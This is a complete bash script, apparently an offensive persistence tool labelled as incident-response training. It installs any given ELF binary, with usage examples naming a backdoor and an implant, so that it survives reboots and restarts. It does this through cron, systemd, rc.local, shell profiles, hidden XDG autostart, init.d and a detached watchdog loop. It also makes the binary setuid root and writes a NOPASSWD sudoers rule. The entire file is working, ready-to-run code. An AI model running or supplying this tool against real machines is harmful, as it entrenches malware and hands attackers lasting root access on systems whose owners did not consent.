#!/usr/bin/env bash

# =============================================================================
#  "persist at all costs" – Persistent ELF Execution for Incident Response Training
#
#  This script is intended **exclusively** for legal, authorized security
#  training within isolated lab environments. Unauthorized use is prohibited.
#
#  Usage: ./persist.sh <ELF_PATH> [METHOD_FLAGS...]
#  Methods (toggled via argv):
#    --all             Enable all applicable methods (default if no flags given)
#    --cron            Cron @reboot + watchdog every minute
#    --systemd         User or system systemd service (Restart=always)
#    --rc-local        /etc/rc.local (if writable, root)
#    --bashrc          Append to ~/.bashrc and ~/.profile
#    --xdg-autostart   XDG autostart .desktop file (if $XDG_CONFIG_HOME exists)
#    --initd           Legacy SysV init script (requires root)
#    --watchdog        Standalone watchdog loop (background, detaches from terminal)
#    --elevate         Attempt to make the ELF setuid root (requires root or sudo)
#    --sudoers         Add NOPASSWD sudoers rule for the ELF (requires root)
#
#  Privilege escalation is attempted automatically if the script is run as
#  root or can obtain root via sudo. For non-root users, only user‑scope
#  methods are used (cron, systemd --user, bashrc, xdg, watchdog).
# =============================================================================

set -o pipefail

# ------------- Helper Functions -------------
die() {
    echo "[!] ERROR: $*" >&2
    exit 1
}

warn() {
    echo "[-] WARNING: $*" >&2
}

info() {
    echo "[+] $*"
}

is_root() {
    [ "$(id -u)" -eq 0 ]
}

# Attempt to gain root privileges via sudo (non‑interactive if possible)
try_escalate() {
    if is_root; then
        return 0
    fi
    # Check if we can use sudo without a password
    if command -v sudo &>/dev/null && sudo -n true 2>/dev/null; then
        info "Attempting to re-run as root via sudo..."
        exec sudo bash "$0" "$@"
    else
        warn "Not root and passwordless sudo not available – continuing with user‑scope methods only."
        return 1
    fi
}

# Make sure the target ELF exists and is executable
validate_elf() {
    local elf="$1"
    [ -f "$elf" ] || die "File not found: $elf"
    [ -x "$elf" ] || die "File is not executable: $elf"
    # Resolve to absolute path
    elf="$(realpath "$elf")"
    echo "$elf"
}

# ------------- Persistence Methods -------------

install_cron() {
    local elf="$1"
    info "Installing cron persistence..."
    local crontab_cmd
    if is_root; then
        crontab_cmd="crontab -"
        # For root, we write directly to /var/spool/cron/crontabs/root if possible
        if [ -w /var/spool/cron/crontabs/root ]; then
            crontab_cmd="tee -a /var/spool/cron/crontabs/root"
        fi
    else
        crontab_cmd="crontab -"
    fi

    # Capture existing crontab, add entries, then reinstall
    local existing_cron
    existing_cron=$(crontab -l 2>/dev/null || true)

    # @reboot entry
    local reboot_entry="@reboot $elf &>/dev/null &"
    # Watchdog: every minute check if process is alive, restart if not
    local watchdog_entry="* * * * * pgrep -x '$(basename "$elf")' >/dev/null || nohup $elf &>/dev/null &"

    {
        echo "$existing_cron"
        # Avoid duplicates
        echo "$existing_cron" | grep -Fq "$elf" || echo "$reboot_entry"
        echo "$existing_cron" | grep -Fq "pgrep -x '$(basename "$elf")'" || echo "$watchdog_entry"
    } | crontab - 2>/dev/null && info "Cron entries added." || warn "Failed to update crontab."
}

install_systemd() {
    local elf="$1"
    info "Installing systemd persistence..."

    local unit_name="persist-$(basename "$elf")"

    # Decide scope
    local unit_dir systemctl_cmd
    if is_root; then
        unit_dir="/etc/systemd/system"
        systemctl_cmd="systemctl"
    else
        # User scope
        unit_dir="${XDG_RUNTIME_DIR:-/run/user/$(id -u)}/systemd/user"
        [ -d "$unit_dir" ] || unit_dir="$HOME/.config/systemd/user"
        mkdir -p "$unit_dir" 2>/dev/null
        systemctl_cmd="systemctl --user"
        # Enable lingering if possible (requires root privileges once)
        if command -v loginctl &>/dev/null; then
            loginctl enable-linger "$(whoami)" 2>/dev/null || true
        fi
        # Export DBUS for user scope
        export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$(id -u)/bus" 2>/dev/null || true
    fi

    local unit_file="$unit_dir/${unit_name}.service"

    cat > "$unit_file" <<EOF
[Unit]
Description=Persistent service for $(basename "$elf")
After=network.target

[Service]
Type=simple
ExecStart=$elf
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF

    $systemctl_cmd daemon-reload 2>/dev/null || warn "systemctl daemon-reload failed."
    $systemctl_cmd enable "$unit_name" 2>/dev/null || warn "Could not enable systemd unit."
    $systemctl_cmd start "$unit_name" 2>/dev/null && info "systemd service started." || warn "systemd service start failed."
}

install_rc_local() {
    local elf="$1"
    info "Installing rc.local persistence..."
    if [ ! -f /etc/rc.local ]; then
        warn "/etc/rc.local does not exist – cannot use this method."
        return 1
    fi
    if ! is_root; then
        warn "rc.local requires root privileges; skipping."
        return 1
    fi
    # Append line if not already present
    local line="nohup $elf &>/dev/null &"
    if grep -Fq "$elf" /etc/rc.local 2>/dev/null; then
        info "Already present in rc.local."
    else
        # Insert before 'exit 0' if it exists, otherwise just append
        if grep -q '^exit 0' /etc/rc.local; then
            sed -i "/^exit 0/i $line" /etc/rc.local
        else
            echo "$line" >> /etc/rc.local
        fi
        chmod +x /etc/rc.local 2>/dev/null
        info "rc.local updated."
    fi
}

install_bashrc() {
    local elf="$1"
    info "Installing shell profile persistence (~/.bashrc, ~/.profile) ..."
    local line="(nohup $elf &>/dev/null &)"
    for file in "$HOME/.bashrc" "$HOME/.profile"; do
        [ -f "$file" ] || touch "$file"
        if grep -Fq "$elf" "$file" 2>/dev/null; then
            info "Already present in $file."
        else
            echo "$line" >> "$file" && info "Added to $file."
        fi
    done
}

install_xdg_autostart() {
    local elf="$1"
    info "Installing XDG autostart persistence..."
    local autostart_dir="${XDG_CONFIG_HOME:-$HOME/.config}/autostart"
    mkdir -p "$autostart_dir" || { warn "Cannot create autostart directory."; return 1; }

    local desktop_file="$autostart_dir/persist-$(basename "$elf").desktop"
    cat > "$desktop_file" <<EOF
[Desktop Entry]
Type=Application
Name=Persist $(basename "$elf")
Exec=$elf
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    info "XDG autostart .desktop file created."
}

install_initd() {
    local elf="$1"
    info "Installing legacy init.d script..."
    if ! is_root; then
        warn "init.d requires root; skipping."
        return 1
    fi
    local init_script="/etc/init.d/persist-$(basename "$elf")"
    cat > "$init_script" <<EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          persist-$(basename "$elf")
# Required-Start:    \$remote_fs \$syslog
# Required-Stop:     \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Persistent $(basename "$elf")
### END INIT INFO

case "\$1" in
  start)
    nohup $elf &>/dev/null &
    ;;
  stop)
    pkill -f "$elf" 2>/dev/null || true
    ;;
  *)
    echo "Usage: \$0 {start|stop}"
    exit 1
esac
exit 0
EOF
    chmod +x "$init_script"
    if command -v update-rc.d &>/dev/null; then
        update-rc.d "persist-$(basename "$elf")" defaults 2>/dev/null && info "init.d script registered (update-rc.d)."
    elif command -v chkconfig &>/dev/null; then
        chkconfig --add "persist-$(basename "$elf")" 2>/dev/null && info "init.d script registered (chkconfig)."
    else
        warn "No update-rc.d or chkconfig found; init.d script may not auto-start."
    fi
}

install_watchdog() {
    local elf="$1"
    info "Launching standalone watchdog (background, disowned)..."
    # This loop will restart the ELF if it dies
    (
        nohup bash -c "
            while true; do
                if ! pgrep -x '$(basename "$elf")' >/dev/null; then
                    nohup '$elf' &>/dev/null &
                fi
                sleep 5
            done
        " &>/dev/null &
    )
    disown -a 2>/dev/null || true
    info "Watchdog started (PID approx. $!)"
}

# ------------- Privilege Escalation Helpers -------------

elevate_elf() {
    local elf="$1"
    info "Attempting to make ELF setuid root..."
    if ! is_root; then
        warn "Must be root to set setuid bit; skipping."
        return 1
    fi
    chown root:root "$elf" 2>/dev/null || warn "chown failed."
    chmod u+s "$elf" 2>/dev/null && info "setuid root set on $elf." || warn "chmod u+s failed."
}

add_sudoers_rule() {
    local elf="$1"
    info "Adding NOPASSWD sudoers rule for $elf..."
    if ! is_root; then
        warn "Must be root to modify sudoers; skipping."
        return 1
    fi
    local user
    user="${SUDO_USER:-$(whoami)}"
    local sudoers_file="/etc/sudoers.d/persist-$(basename "$elf")"
    echo "$user ALL=(ALL) NOPASSWD: $elf" > "$sudoers_file" \
        && chmod 440 "$sudoers_file" \
        && info "Sudoers rule added for $user."
}

# ------------- Argument Parsing -------------

usage() {
    cat <<EOF
Usage: $0 <ELF_PATH> [OPTIONS]
Options:
  --all            Enable all applicable methods
  --cron           Cron @reboot + per-minute watchdog
  --systemd        systemd service (user or system)
  --rc-local       /etc/rc.local (root)
  --bashrc         Append to ~/.bashrc and ~/.profile
  --xdg-autostart  XDG autostart .desktop file
  --initd          SysV init script (root)
  --watchdog       Standalone background watchdog loop
  --elevate        Set setuid root on ELF (root)
  --sudoers        Add NOPASSWD sudoers rule (root)
Examples:
  $0 ./my_backdoor --all
  $0 /opt/implant --cron --systemd --elevate
EOF
    exit 0
}

# ---------- Main ----------

[[ $# -eq 0 ]] && usage

elf_origin="$1"
shift

# Validate target early
elf=$(validate_elf "$elf_origin") || exit 1

# If user wants help
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    usage
fi

# If no method flags, enable all
if [[ $# -eq 0 ]]; then
    set -- --all
fi

methods=()
while [[ $# -gt 0 ]]; do
    case "$1" in
        --all) methods+=("cron" "systemd" "rc-local" "bashrc" "xdg-autostart" "initd" "watchdog" "elevate" "sudoers") ;;
        --cron) methods+=("cron") ;;
        --systemd) methods+=("systemd") ;;
        --rc-local) methods+=("rc-local") ;;
        --bashrc) methods+=("bashrc") ;;
        --xdg-autostart) methods+=("xdg-autostart") ;;
        --initd) methods+=("initd") ;;
        --watchdog) methods+=("watchdog") ;;
        --elevate) methods+=("elevate") ;;
        --sudoers) methods+=("sudoers") ;;
        -h|--help) usage ;;
        *) die "Unknown option: $1" ;;
    esac
    shift
done

# Attempt root escalation right away if any root-required method is requested
requires_root=0
for m in "${methods[@]}"; do
    case "$m" in
        rc-local|initd|elevate|sudoers) requires_root=1 ;;
    esac
done

if [[ $requires_root -eq 1 ]] && ! is_root; then
    try_escalate "$0" "$elf_origin" "${methods[@]/#/--}"  # pass original args back
    # If try_escalate fails it returns and we continue as non‑root (some methods will be skipped)
fi

info "Target ELF: $elf"
info "Running as: $(whoami) (UID=$(id -u))"

# Execute requested methods
for method in "${methods[@]}"; do
    case "$method" in
        cron) install_cron "$elf" ;;
        systemd) install_systemd "$elf" ;;
        rc-local) install_rc_local "$elf" ;;
        bashrc) install_bashrc "$elf" ;;
        xdg-autostart) install_xdg_autostart "$elf" ;;
        initd) install_initd "$elf" ;;
        watchdog) install_watchdog "$elf" ;;
        elevate) elevate_elf "$elf" ;;
        sudoers) add_sudoers_rule "$elf" ;;
    esac
done

info "Persistence installation complete."
